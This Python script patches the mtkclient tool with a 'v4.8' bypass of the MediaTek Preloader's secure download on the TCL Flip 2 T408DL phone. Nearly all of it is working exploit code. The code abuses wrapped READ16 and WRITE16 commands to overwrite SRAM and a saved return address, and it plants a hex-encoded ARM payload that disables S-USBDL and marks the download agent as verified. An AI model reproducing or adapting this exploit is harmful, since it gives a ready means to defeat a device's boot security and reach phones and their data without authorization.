#!/usr/bin/env python3
"""
TCL Flip 2 T408DL Preloader bypass v4.8 — secondary-alias compact-guard payload placement.

Fixes the two failures observed in v4.3/v4.4:
  * v4.3 could not find a safe zero cave below the live C-window stack.
  * v4.4 attempted to stream all the way to 0x0010935D and consistently
    lost USB around replay offset 0xE1200.

v4.8 returns to the small-payload architecture, but places the payload
dynamically in the already-observed E/0x220000 SRAM mirror near 0xE1000.
The replay is hard-capped below the observed 0xE1200 transport failure.

Only volatile SRAM is changed by the bypass; flash/storage is untouched.
"""

from pathlib import Path
import argparse
import shutil

HELPERS = '    # ------------------------------------------------------------------\n    # TCL Flip 2 T408DL volatile Preloader bypass — v4.8\n    #\n    # Improvements over v3:\n    #   * dynamically place payload inside the proven executable SRAM alias\n    #   * avoid hard-coded USB helper calls inside the payload\n    #   * payload exits through the real usbdl_handler epilogue instead\n    #     of returning into the contaminated handler loop\n    #   * host re-handshakes into a fresh usbdl_handler instance\n    #   * both state changes are read-back verified before SEND_DA\n    #\n    # No flash/storage writes are performed by this bypass.\n    # ------------------------------------------------------------------\n\n    def _t408dl_v4_quiet(self, quiet):\n        saved = []\n        for obj in (getattr(self.mtk, "port", None),\n                    getattr(getattr(self.mtk, "port", None), "cdc", None)):\n            if obj is not None and hasattr(obj, "loglevel"):\n                try:\n                    saved.append((obj, obj.loglevel))\n                    if quiet:\n                        obj.loglevel = logging.INFO\n                except Exception:\n                    pass\n        return saved\n\n    @staticmethod\n    def _t408dl_v4_restore_log(saved):\n        for obj, level in saved:\n            try:\n                obj.loglevel = level\n            except Exception:\n                pass\n\n    @staticmethod\n    def _t408dl_v4_u32(buf, addr):\n        from struct import unpack_from\n        if addr < 0 or addr + 4 > len(buf):\n            raise RuntimeError(\n                "T408DL-V4.8: address outside snapshot: 0x%08X" % addr\n            )\n        return unpack_from("<I", bytes(buf), addr)[0]\n\n    @staticmethod\n    def _t408dl_v4_put32(buf, addr, value):\n        from struct import pack\n        if addr < 0 or addr + 4 > len(buf):\n            raise RuntimeError(\n                "T408DL-V4.8: patch outside replay: 0x%08X" % addr\n            )\n        buf[addr:addr + 4] = pack("<I", value & 0xFFFFFFFF)\n\n    def _t408dl_v4_read_low(self, low_end_exclusive):\n        from struct import pack\n\n        low_end_exclusive = (int(low_end_exclusive) + 1) & ~1\n        count = 1 + (low_end_exclusive // 2)\n        total = count * 2\n\n        self.info(\n            "T408DL-V4.8: overflow READ16 low_end=0x%08X "\n            "count=0x%X wire=0x%X"\n            % (low_end_exclusive, count, total)\n        )\n\n        if not self.echo(self.Cmd.READ16.value):\n            raise RuntimeError("T408DL-V4.8: READ16 command echo failed")\n        if not self.echo(pack(">I", 0xFFFFFFFE)):\n            raise RuntimeError("T408DL-V4.8: READ16 address echo failed")\n        if not self.echo(pack(">I", count)):\n            raise RuntimeError("T408DL-V4.8: READ16 count echo failed")\n\n        status = self.rword()\n        if status is None or status > 0xFF:\n            raise RuntimeError(\n                "T408DL-V4.8: wrapped READ16 rejected: %r" % status\n            )\n\n        saved = self._t408dl_v4_quiet(True)\n        try:\n            wire = bytes(self.usbread(total))\n        finally:\n            self._t408dl_v4_restore_log(saved)\n\n        if len(wire) != total:\n            raise RuntimeError(\n                "T408DL-V4.8: short wrapped read: 0x%X/0x%X"\n                % (len(wire), total)\n            )\n\n        final = self.rword()\n        if final is None or final > 0xFF:\n            raise RuntimeError(\n                "T408DL-V4.8: READ16 final status failed: %r" % final\n            )\n\n        # First word belongs to physical 0xFFFFFFFE.  READ16 encodes each\n        # following halfword BE on USB, so swap bytes back to raw LE memory.\n        src = wire[2:]\n        low = bytearray(len(src))\n        low[0::2] = src[1::2]\n        low[1::2] = src[0::2]\n        return bytearray(wire), low\n\n    @staticmethod\n    def _t408dl_v4_low_to_wire(first_halfword, low):\n        if len(low) & 1:\n            raise RuntimeError("T408DL-V4.8: odd replay memory size")\n\n        out = bytearray(first_halfword)\n        be = bytearray(len(low))\n        be[0::2] = low[1::2]\n        be[1::2] = low[0::2]\n        out += be\n        return out\n\n    def _t408dl_v4_write_wire(self, wire):\n        from struct import pack\n\n        wire = bytes(wire)\n        if len(wire) < 4 or (len(wire) & 1):\n            raise RuntimeError("T408DL-V4.8: invalid D3 replay length")\n\n        count = len(wire) // 2\n\n        self.warning(\n            "T408DL-V4.8: controlled D3 replay: "\n            "count=0x%X bytes=0x%X" % (count, len(wire))\n        )\n\n        if not self.echo(self.Cmd.WRITE16_NO_ECHO.value):\n            raise RuntimeError("T408DL-V4.8: D3 command echo failed")\n        if not self.echo(pack(">I", 0xFFFFFFFE)):\n            raise RuntimeError("T408DL-V4.8: D3 address echo failed")\n        if not self.echo(pack(">I", count)):\n            raise RuntimeError("T408DL-V4.8: D3 count echo failed")\n\n        status = self.rword()\n        if status is None or status > 0xFF:\n            raise RuntimeError(\n                "T408DL-V4.8: D3 range check rejected: %r" % status\n            )\n\n        saved = self._t408dl_v4_quiet(True)\n        try:\n            pos = 0\n            while pos < len(wire):\n                block = wire[pos:pos + 0x200]\n                if not self.usbwrite(block):\n                    raise RuntimeError(\n                        "T408DL-V4.8: USB write failed at replay offset 0x%X"\n                        % pos\n                    )\n                pos += len(block)\n        finally:\n            self._t408dl_v4_restore_log(saved)\n\n        final = self.rword()\n        if final is None or final > 0xFF:\n            raise RuntimeError(\n                "T408DL-V4.8: D3 final status failed: %r" % final\n            )\n\n        self.info("T408DL-V4.8: D3 final status = 0x%04X" % final)\n        return True\n\n    def _t408dl_v4_resync(self):\n        import time\n\n        self.warning(\n            "T408DL-V4.8: payload returned through usbdl_handler epilogue; "\n            "resynchronizing outer USB listener..."\n        )\n\n        # Give usb_listen a moment to unwind/re-enter its listener path.\n        time.sleep(0.10)\n\n        for attempt in range(1, 5):\n            try:\n                if self.mtk.serialportname:\n                    ok = self.mtk.port.serial_handshake(maxtries=20)\n                else:\n                    ok = self.mtk.port.handshake(maxtries=20)\n\n                if ok:\n                    self.info(\n                        "T408DL-V4.8: listener handshake succeeded "\n                        "(attempt %d)" % attempt\n                    )\n                    return True\n            except Exception as exc:\n                self.info(\n                    "T408DL-V4.8: handshake attempt %d raised %r"\n                    % (attempt, exc)\n                )\n\n            time.sleep(0.15)\n\n        return False\n\n    def _t408dl_disable_susbdl(self):\n        from struct import pack\n        import time\n\n        if getattr(self, "_t408dl_v4_done", False):\n            return True\n\n        actual = (\n            int(getattr(self.config, "hwcode", 0) or 0),\n            int(getattr(self.config, "hw_sub_code", 0) or 0),\n            int(getattr(self.config, "hwver", 0) or 0),\n            int(getattr(self.config, "swver", 0) or 0),\n        )\n        expected = (0x0699, 0x8A00, 0xCB00, 0x0002)\n\n        if actual != expected:\n            self.error(\n                "T408DL-V4.8: silicon mismatch %r != %r; refusing exploit."\n                % (actual, expected)\n            )\n            return False\n\n        # Live/static values established from this exact T408DL.\n        ATTR              = 0x0010043C\n        G_DA_VERIFIED     = 0x0010935D\n\n        # SRAM alias geometry established by stack scouting:\n        #   0x000C0AC8 <-> 0x00200AC8\n        #   0x000E0AC8 <-> 0x00220AC8\n        #\n        # v4.3 searched only below the live stack in the C-window and found\n        # no sufficiently guarded zero cave.  v4.4 proved that D3 can stream\n        # well past the stack but consistently dies near wire offset 0xE1200.\n        # Therefore v4.8 searches the *post-stack secondary mirror* around\n        # low 0x000E1000 (the mirrored DA landing area) and caps the replay\n        # below the observed failure boundary.\n        ALIAS_DELTA       = 0x00140000\n        SCRATCH_LOW_MIN   = 0x000E0F00\n        SCRATCH_LOW_MAX   = 0x000E1100\n        D3_FAIL_BOUNDARY  = 0x000E1200\n        PAYLOAD_WRITE     = None\n        PAYLOAD_EXEC      = None\n\n        # Active helper/stack geometry learned from the live D0 snapshot.\n        D3_BASE_SLOT      = 0x000C0AAC\n        D3_COUNT_SLOT     = 0x000C0AB0\n        D3_SAVE_R4        = 0x000C0AB8\n        D3_SAVE_R5        = 0x000C0ABC\n        D3_SAVE_R6        = 0x000C0AC0\n        D3_SAVE_R7        = 0x000C0AC4\n        D3_SAVE_LR        = 0x000C0AC8\n\n        READ16_NORMAL_LR  = 0x00202B17\n\n        # D3 returns to our payload.  The payload exits through the *handler*\n        # epilogue, not the D3 continuation.\n        #\n        # Stock preloader disassembly is offset -0xF0 from live runtime:\n        #   listed 0x00202C8E -> live 0x00202D7E\n        HANDLER_EPILOGUE  = 0x00202D7F  # Thumb bit included\n\n        # Handler current SP while its D0/D3 helper is active.\n        HANDLER_SP        = 0x00200ACC\n        HANDLER_R7        = HANDLER_SP + 0x0D\n\n        # v4.3 makes no helper calls inside the payload.  It patches state,\n        # executes architectural barriers, then tail-branches to the verified\n        # handler epilogue.  Listener recovery + explicit readback is the\n        # execution proof.  This removes the fragile PUT_WORD dependency.\n        payload = bytes.fromhex(\n            "40f23c44c0f210040025256049f25d34c0f2100401252570bff34f8fbff36f8f42f67f56c0f220063047"\n        )\n\n        self.warning(\n            "T408DL-V4.8: preparing verified stack-alias pivot "\n            "(volatile RAM only)"\n        )\n\n        # READ far enough to include every location inspected below.\n        # This is READ-ONLY. The later D3 write is dynamically capped below\n        # the empirically observed 0x000E1200 failure boundary.\n        snapshot_end = max(\n            D3_SAVE_LR + 4,\n            ATTR + 4,\n            G_DA_VERIFIED + 1,\n        )\n        self.info(\n            "T408DL-V4.8: read-only validation snapshot_end=0x%08X"\n            % snapshot_end\n        )\n        wire, low = self._t408dl_v4_read_low(snapshot_end)\n\n        mode = self._t408dl_v4_u32(low, ATTR)\n        d0_lr = self._t408dl_v4_u32(low, D3_SAVE_LR)\n\n        self.info(\n            "T408DL-V4.8: S-USBDL @0x%08X = 0x%08X" % (ATTR, mode)\n        )\n        self.info(\n            "T408DL-V4.8: live D0 saved-LR signature @0x%08X = 0x%08X"\n            % (D3_SAVE_LR, d0_lr)\n        )\n\n        # Accept a pre-existing bypass only if BOTH state values agree.\n        if mode == 0:\n            _, state = self._t408dl_v4_read_low(G_DA_VERIFIED + 1)\n            gv = state[G_DA_VERIFIED]\n            if gv != 1:\n                self.error(\n                    "T408DL-V4.8: inconsistent prior state: S-USBDL=0 but "\n                    "g_da_verified=0x%02X; refusing SEND_DA." % gv\n                )\n                return False\n            self.warning(\n                "T408DL-V4.8: bypass already live and verified; no pivot required."\n            )\n            self._t408dl_v4_done = True\n            return True\n\n        if mode not in (0x11, 0x22):\n            self.error(\n                "T408DL-V4.8: unexpected S-USBDL value 0x%08X; refusing."\n                % mode\n            )\n            return False\n\n        if d0_lr != READ16_NORMAL_LR:\n            self.error(\n                "T408DL-V4.8: stack signature mismatch; expected 0x%08X. "\n                "Refusing D3." % READ16_NORMAL_LR\n            )\n            return False\n\n        # Prove both observed alias relationships instead of assuming them.\n        if D3_SAVE_LR + ALIAS_DELTA != HANDLER_SP - 4:\n            self.error("T408DL-V4.8: primary SRAM alias invariant failed.")\n            return False\n        if 0x000E0AC8 + ALIAS_DELTA != 0x00220AC8:\n            self.error("T408DL-V4.8: secondary SRAM alias invariant failed.")\n            return False\n\n        # Dynamically locate a guarded zero cave in the secondary mirror near\n        # 0xE1000.  This is intentionally after the active D3 stack and still\n        # keeps compact verified zero guards around the payload while staying before the observed 0xE1200 timeout.\n        guard_before = 0x0C\n        guard_after = 0x0C\n        search_lo = SCRATCH_LOW_MIN\n        search_hi = min(SCRATCH_LOW_MAX, len(low))\n        need = guard_before + len(payload) + guard_after\n\n        best_zero_run = 0\n        run = 0\n        for b in low[search_lo:search_hi]:\n            if b == 0:\n                run += 1\n                if run > best_zero_run:\n                    best_zero_run = run\n            else:\n                run = 0\n\n        stop = search_hi - need + 1\n        for probe in range(search_lo, max(search_lo, stop)):\n            cand = (probe + guard_before + 3) & ~3\n            region_start = cand - guard_before\n            region_end = cand + len(payload) + guard_after\n            if region_end > search_hi:\n                break\n            if not any(low[region_start:region_end]):\n                PAYLOAD_WRITE = cand\n                break\n\n        if PAYLOAD_WRITE is None:\n            self.error(\n                "T408DL-V4.8: no guarded zero cave in secondary SRAM window "\n                "0x%08X..0x%08X (largest zero run=0x%X); refusing pivot."\n                % (search_lo, search_hi, best_zero_run)\n            )\n            return False\n\n        PAYLOAD_EXEC = PAYLOAD_WRITE + ALIAS_DELTA\n        replay_end = (PAYLOAD_WRITE + len(payload) + guard_after + 1) & ~1\n\n        if replay_end >= D3_FAIL_BOUNDARY:\n            self.error(\n                "T408DL-V4.8: payload replay end 0x%08X reaches observed "\n                "D3 failure boundary 0x%08X; refusing."\n                % (replay_end, D3_FAIL_BOUNDARY)\n            )\n            return False\n\n        if not (0x00220F00 <= PAYLOAD_EXEC < 0x00221100):\n            self.error(\n                "T408DL-V4.8: derived exec address 0x%08X is outside the "\n                "validated secondary mirror window." % PAYLOAD_EXEC\n            )\n            return False\n\n        self.info(\n            "T408DL-V4.8: selected guarded secondary-mirror scratch "\n            "low=0x%08X exec=0x%08X size=0x%X replay_end=0x%08X"\n            % (PAYLOAD_WRITE, PAYLOAD_EXEC, len(payload), replay_end)\n        )\n\n        # Saved caller registers from the active D0 helper frame.\n        # D0 push layout at this exact stack:\n        #   locals/base/count  C0AB4/C0AB8\n        #   saved r4/r5/r6     C0ABC/C0AC0/C0AC4\n        #   saved LR           C0AC8\n        saved_r4 = self._t408dl_v4_u32(low, 0x000C0ABC)\n        saved_r5 = self._t408dl_v4_u32(low, 0x000C0AC0)\n        saved_r6 = self._t408dl_v4_u32(low, 0x000C0AC4)\n\n        self.info(\n            "T408DL-V4.8: handler caller regs "\n            "r4=0x%08X r5=0x%08X r6=0x%08X r7=0x%08X"\n            % (saved_r4, saved_r5, saved_r6, HANDLER_R7)\n        )\n\n        if not (0x00200000 <= saved_r4 < 0x00210000):\n            self.error("T408DL-V4.8: unexpected saved r4; refusing.")\n            return False\n        if not (0x00100000 <= saved_r5 < 0x00110000):\n            self.error("T408DL-V4.8: unexpected saved r5; refusing.")\n            return False\n        if not (0x00200000 <= saved_r6 < 0x00210000):\n            self.error("T408DL-V4.8: unexpected saved r6; refusing.")\n            return False\n\n        # Stream only as far as the guarded payload cave.  This is longer\n        # than the old C0ACC replay, but remains below the empirically observed\n        # E1200 transport failure boundary.\n        low_end = max(D3_SAVE_LR + 4, replay_end)\n        count = 1 + (low_end // 2)\n\n        replay_low = bytearray(low[:low_end])\n        replay_low[PAYLOAD_WRITE:PAYLOAD_WRITE + len(payload)] = payload\n\n        # Reconstruct D3\'s active frame immediately before D3 overwrites its\n        # own stack through the SRAM alias.\n        self._t408dl_v4_put32(replay_low, D3_BASE_SLOT, 0xFFFFFFFE)\n        self._t408dl_v4_put32(replay_low, D3_COUNT_SLOT, count)\n        self._t408dl_v4_put32(replay_low, D3_SAVE_R4, saved_r4)\n        self._t408dl_v4_put32(replay_low, D3_SAVE_R5, saved_r5)\n        self._t408dl_v4_put32(replay_low, D3_SAVE_R6, saved_r6)\n        self._t408dl_v4_put32(replay_low, D3_SAVE_R7, HANDLER_R7)\n        self._t408dl_v4_put32(\n            replay_low, D3_SAVE_LR, PAYLOAD_EXEC | 1\n        )\n\n        # Preserve the 0xFFFFFFFE halfword from the snapshot.\n        first_halfword = bytes(wire[:2])\n        replay_wire = self._t408dl_v4_low_to_wire(\n            first_halfword, replay_low\n        )\n\n        self.warning(\n            "T408DL-V4.8: pivot: payload write alias=0x%08X "\n            "exec alias=0x%08X; D3 saved LR @0x%08X -> 0x%08X; "\n            "handler epilogue=0x%08X"\n            % (\n                PAYLOAD_WRITE, PAYLOAD_EXEC,\n                D3_SAVE_LR, PAYLOAD_EXEC | 1, HANDLER_EPILOGUE,\n            )\n        )\n\n        self._t408dl_v4_write_wire(replay_wire)\n\n        # No marker helper is used.  A valid payload must unwind back into the\n        # listener; after that we verify protocol identity and both patched\n        # state values before ordinary SEND_DA is permitted.\n        if not self._t408dl_v4_resync():\n            self.error(\n                "T408DL-V4.8: D3 completed but listener recovery failed; "\n                "payload execution/unwind did not complete cleanly."\n            )\n            return False\n\n        # Confirm we are really back in a fresh command handler.\n        if not self.echo(0xFD):\n            self.error("T408DL-V4.8: GET_HW_CODE echo failed after resync.")\n            return False\n\n        hw = self.rdword()\n        self.info(\n            "T408DL-V4.8: post-pivot GET_HW_CODE = 0x%08X" % hw\n        )\n        if ((hw >> 16) & 0xFFFF) != 0x0699:\n            self.error("T408DL-V4.8: wrong HW code after resync.")\n            return False\n\n        # Mandatory state verification before allowing SEND_DA.\n        _, verify = self._t408dl_v4_read_low(G_DA_VERIFIED + 1)\n        verify_mode = self._t408dl_v4_u32(verify, ATTR)\n        verify_gv = verify[G_DA_VERIFIED]\n\n        self.info(\n            "T408DL-V4.8: readback S-USBDL=0x%08X "\n            "g_da_verified=0x%02X" % (verify_mode, verify_gv)\n        )\n\n        if verify_mode != 0 or verify_gv != 1:\n            self.error(\n                "T408DL-V4.8: state verification failed; refusing SEND_DA."\n            )\n            return False\n\n        self.warning(\n            "T408DL-V4.8: *** CLEAN PIVOT SUCCESS *** "\n            "Proceeding with ordinary SEND_DA."\n        )\n\n        self._t408dl_v4_done = True\n        return True'
CALL = '        if (int(getattr(self.config, "hwcode", 0) or 0) == 0x0699 and\n                int(getattr(self.config, "hw_sub_code", 0) or 0) == 0x8A00 and\n                int(getattr(self.config, "hwver", 0) or 0) == 0xCB00 and\n                int(getattr(self.config, "swver", 0) or 0) == 0x0002):\n            if not self._t408dl_disable_susbdl():\n                self.error("T408DL-V4.8: exploit preparation failed; aborting DA upload.")\n                return False\n'

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--repo", default=".", help="mtkclient repository root")
    ap.add_argument("--restore", action="store_true")
    args = ap.parse_args()

    repo = Path(args.repo).expanduser().resolve()
    src = repo / "mtkclient" / "Library" / "mtk_preloader.py"
    pristine = src.with_name("mtk_preloader.py.t408dl-fullsend-backup")

    if not src.is_file():
        raise SystemExit("Not found: " + str(src))
    if not pristine.is_file():
        raise SystemExit(
            "Pristine backup not found: " + str(pristine) +
            "\nRefusing to stack v4.8 on an unknown source file."
        )

    if args.restore:
        shutil.copy2(pristine, src)
        compile(src.read_text(), str(src), "exec")
        print("Restored original:", src)
        return

    base = pristine.read_text()
    marker = "    def send_da(self, address, size, sig_len, dadata):\n"
    pos = base.find(marker)
    if pos < 0:
        raise SystemExit("Could not locate Preloader.send_da().")

    helpers_text = HELPERS + ("\n" if not HELPERS.endswith("\n") else "")
    patched = base[:pos] + helpers_text + "\n" + base[pos:]

    pos = patched.find(marker)
    insert_at = pos + len(marker)
    patched = patched[:insert_at] + CALL + patched[insert_at:]

    compile(patched, str(src), "exec")
    src.write_text(patched)

    print("Installed T408DL v4.8 secondary-alias bypass:", src)
    print("Pristine restore point:", pristine)

if __name__ == "__main__":
    main()
